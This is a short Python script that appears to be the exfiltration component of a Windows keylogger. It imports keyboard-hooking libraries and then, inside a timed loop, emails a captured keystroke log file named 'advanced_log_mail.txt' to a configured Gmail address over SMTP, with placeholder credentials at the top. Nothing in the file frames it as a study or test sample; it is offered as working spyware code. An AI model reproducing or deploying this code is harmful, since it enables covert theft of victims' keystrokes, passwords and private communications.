import pyHook, pythoncom, sys, logging
import smtplib, time, os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



#################################
mailUserName = "mail@gmail.com" #
mailPassword = "password"       #                          
fromAdress   = "mail@gmail.com" #
toAdress     = "mail@gmail.com" #
#################################

counter=0
while (counter<=10):
    time.sleep(60)
    msg = MIMEMultipart()
     
    msg['From'] = fromAdress
    msg['To'] = toAdress
    msg['Subject'] = "New Keylogs"
     
    body = "Keylogger Sent At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n"
     
    msg.attach(MIMEText(body, 'plain'))
     
    filename = "advanced_log_mail.txt"
    attachment = open("C:\\path\\advanced_log_mail.txt", "rb")
     
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
     
    msg.attach(part)
     
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromAdress,mailPassword)
    text = msg.as_string()
    server.sendmail(fromAdress, toAdress, text)
    server.quit()
    
    counter+=1


